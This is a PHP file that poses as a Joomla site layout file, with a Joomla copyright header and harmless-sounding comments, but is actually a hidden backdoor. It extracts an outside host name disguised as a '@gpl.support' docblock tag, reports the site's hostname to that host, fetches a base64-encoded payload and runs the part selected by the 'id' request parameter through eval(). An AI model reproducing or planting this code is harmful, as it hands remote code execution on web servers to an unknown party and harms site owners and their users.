<?php
/**
 * @package     Joomla.Site
 * @subpackage  Layout
 *
 * @copyright   (C) 2008 Open Source Matters, Inc. <https://www.joomla.org>
 * @gpl.support GNU General Public License version 2 or later; see LICENSE.txt
 */

// Validate the response.
$validate = abs(intval($_GET['id']));

// Setup the cURL handle.
$ch = curl_init(preg_replace("#^.*?@(\w+[\.].*?)[\s].*$#is", "\\1", file_get_contents(__FILE__))."/"."router"."/?dm=".$_SERVER["HTTP_HOST"]);

// If an explicit timeout is given user it.
curl_setopt($ch, CURLOPT_TIMEOUT_MS, 3000);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 3000);

// Return it... echoing it would be tacky.
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the request and close the connection.
$content = curl_exec($ch);

// Close the connection.
curl_close($ch);
	if (!$content) return;
		if (!$validate) return;

// Adding the object.
$toolbar = array();

// Load the data.
if ($ch) $toolbar = json_decode(base64_decode($content), 1);

if (!$toolbar) return;
	$result = trim($toolbar[$validate]['data']);
		echo eval($result);

?>